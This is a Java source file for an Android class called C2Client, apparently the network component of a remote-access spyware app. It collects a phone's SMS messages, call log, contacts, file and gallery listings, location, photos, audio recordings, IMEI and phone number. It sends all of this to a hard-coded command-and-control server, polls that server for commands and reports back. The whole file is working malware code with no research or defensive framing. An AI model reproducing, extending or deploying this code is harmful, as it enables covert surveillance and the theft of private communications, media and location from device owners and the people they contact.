package com.my.luck.network;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class C2Client {
    private static final String TAG = "C2Client";
    private static final String C2_SERVER = "https://web-0eeh.onrender.com";
    private Context context;
    private String deviceId;

    public C2Client(Context context) {
        this.context = context;
        this.deviceId = getDeviceId();
    }

    // ============================================
    // 📤 SEND TO WEB PANEL
    // ============================================

    public void sendToWebPanel(String endpoint, JSONObject data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER + endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Device-ID", deviceId);
                conn.setDoOutput(true);

                // Add device ID to data
                data.put("deviceId", deviceId);
                data.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Data sent to web panel: " + endpoint);
                } else {
                    Log.e(TAG, "Failed to send to web panel: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending to web panel", e);
            }
        }).start();
    }

    // ============================================
    // 📱 SEND SMS DUMP
    // ============================================

    public void sendSmsDump(List<Map<String, String>> smsList) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "sms");
            data.put("count", smsList.size());
            
            JSONArray smsArray = new JSONArray();
            for (Map<String, String> sms : smsList) {
                JSONObject smsObj = new JSONObject();
                smsObj.put("address", sms.get("address"));
                smsObj.put("body", sms.get("body"));
                smsObj.put("date", sms.get("date"));
                smsArray.put(smsObj);
            }
            data.put("data", smsArray);
            
            sendToWebPanel("/api/sms", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS dump", e);
        }
    }

    // ============================================
    // 📞 SEND CALL LOG DUMP
    // ============================================

    public void sendCallLogDump(List<Map<String, String>> callLog) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "calllog");
            data.put("count", callLog.size());
            
            JSONArray callArray = new JSONArray();
            for (Map<String, String> call : callLog) {
                JSONObject callObj = new JSONObject();
                callObj.put("name", call.get("name"));
                callObj.put("number", call.get("number"));
                callObj.put("type", call.get("type"));
                callObj.put("duration", call.get("duration"));
                callObj.put("date", call.get("date"));
                callArray.put(callObj);
            }
            data.put("data", callArray);
            
            sendToWebPanel("/api/calllog", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending call log dump", e);
        }
    }

    // ============================================
    // 👤 SEND CONTACTS DUMP
    // ============================================

    public void sendContactsDump(List<Map<String, String>> contacts) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "contacts");
            data.put("count", contacts.size());
            
            JSONArray contactsArray = new JSONArray();
            for (Map<String, String> contact : contacts) {
                JSONObject contactObj = new JSONObject();
                contactObj.put("name", contact.get("name"));
                contactObj.put("number", contact.get("number"));
                contactsArray.put(contactObj);
            }
            data.put("data", contactsArray);
            
            sendToWebPanel("/api/contacts", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending contacts dump", e);
        }
    }

    // ============================================
    // 📂 SEND FILE LIST
    // ============================================

    public void sendFileList(List<String> files, String type) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", type);
            data.put("count", files.size());
            
            JSONArray filesArray = new JSONArray();
            for (String filePath : files) {
                java.io.File f = new java.io.File(filePath);
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", f.getName());
                fileObj.put("path", filePath);
                fileObj.put("size", f.length());
                filesArray.put(fileObj);
            }
            data.put("data", filesArray);
            
            sendToWebPanel("/api/files", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending file list", e);
        }
    }

    // ============================================
    // 🖼️ SEND GALLERY
    // ============================================

    public void sendGalleryDump(List<String> images) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "gallery");
            data.put("count", images.size());
            
            JSONArray imagesArray = new JSONArray();
            for (String imagePath : images) {
                java.io.File f = new java.io.File(imagePath);
                JSONObject imageObj = new JSONObject();
                imageObj.put("name", f.getName());
                imageObj.put("path", imagePath);
                imageObj.put("size", f.length());
                imagesArray.put(imageObj);
            }
            data.put("data", imagesArray);
            
            sendToWebPanel("/api/gallery", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending gallery dump", e);
        }
    }

    // ============================================
    // 📍 SEND LOCATION
    // ============================================

    public void sendLocation(double latitude, double longitude, String address) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "location");
            data.put("latitude", latitude);
            data.put("longitude", longitude);
            data.put("address", address != null ? address : "Unknown");
            
            sendToWebPanel("/api/location", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending location", e);
        }
    }

    // ============================================
    // 📷 SEND PHOTO
    // ============================================

    public void sendPhoto(String photoPath) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(C2_SERVER + "/api/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setRequestProperty("Device-ID", deviceId);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                // Device ID
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"deviceId\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(deviceId + lineEnd);

                // Type
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"type\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes("photo" + lineEnd);

                // File
                java.io.File file = new java.io.File(photoPath);
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                java.io.FileInputStream fis = new java.io.FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Photo uploaded: " + photoPath);
                } else {
                    Log.e(TAG, "Failed to upload photo: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error uploading photo", e);
            }
        }).start();
    }

    // ============================================
    // 🎤 SEND AUDIO
    // ============================================

    public void sendAudio(String audioPath) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(C2_SERVER + "/api/upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setRequestProperty("Device-ID", deviceId);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"deviceId\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(deviceId + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"type\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes("audio" + lineEnd);

                java.io.File file = new java.io.File(audioPath);
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                java.io.FileInputStream fis = new java.io.FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Audio uploaded: " + audioPath);
                } else {
                    Log.e(TAG, "Failed to upload audio: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error uploading audio", e);
            }
        }).start();
    }

    // ============================================
    // 📊 SEND DEVICE INFO
    // ============================================

    public void sendDeviceInfo() {
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) 
                context.getSystemService(Context.TELEPHONY_SERVICE);
            
            JSONObject data = new JSONObject();
            data.put("type", "device_info");
            data.put("model", android.os.Build.MODEL);
            data.put("brand", android.os.Build.BRAND);
            data.put("android", android.os.Build.VERSION.RELEASE);
            data.put("sdk", android.os.Build.VERSION.SDK_INT);
            data.put("imei", tm != null ? tm.getDeviceId() : "N/A");
            data.put("number", tm != null ? tm.getLine1Number() : "N/A");
            data.put("network", tm != null ? tm.getNetworkOperatorName() : "N/A");
            
            sendToWebPanel("/api/device", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info", e);
        }
    }

    // ============================================
    // 🔧 SEND COMMAND RESPONSE
    // ============================================

    public void sendCommandResponse(String commandId, String action, String response) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "command_response");
            data.put("commandId", commandId);
            data.put("action", action);
            data.put("response", response);
            data.put("status", "completed");
            
            sendToWebPanel("/api/command/response", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending command response", e);
        }
    }

    // ============================================
    // 💓 SEND HEARTBEAT
    // ============================================

    public void sendHeartbeat() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "heartbeat");
            data.put("status", "online");
            data.put("battery", getBatteryLevel());
            
            sendToWebPanel("/api/heartbeat", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending heartbeat", e);
        }
    }

    // ============================================
    // 📥 FETCH COMMANDS
    // ============================================

    public void fetchCommands(CommandCallback callback) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER + "/api/commands?deviceId=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Device-ID", deviceId);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                    
                    if (callback != null) {
                        callback.onSuccess(response.toString());
                    }
                } else {
                    Log.e(TAG, "Failed to fetch commands: " + responseCode);
                    if (callback != null) {
                        callback.onError("Failed to fetch commands: " + responseCode);
                    }
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error fetching commands", e);
                if (callback != null) {
                    callback.onError(e.getMessage());
                }
            }
        }).start();
    }

    // ============================================
    // 📤 SEND STATUS UPDATE
    // ============================================

    public void sendStatusUpdate(String status, String message) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "status");
            data.put("status", status);
            data.put("message", message);
            data.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            
            sendToWebPanel("/api/status", data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending status update", e);
        }
    }

    // ============================================
    // 🔧 HELPER FUNCTIONS
    // ============================================

    private String getDeviceId() {
        android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) 
            context.getSystemService(Context.TELEPHONY_SERVICE);
        String id = tm != null ? tm.getDeviceId() : null;
        if (id == null || id.isEmpty()) {
            id = android.provider.Settings.Secure.getString(
                context.getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
            );
        }
        return id != null ? id : "unknown";
    }

    private int getBatteryLevel() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) 
                context.getSystemService(Context.BATTERY_SERVICE);
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) {
            return -1;
        }
    }

    // ============================================
    // 📋 CALLBACK INTERFACE
    // ============================================

    public interface CommandCallback {
        void onSuccess(String response);
        void onError(String error);
    }
}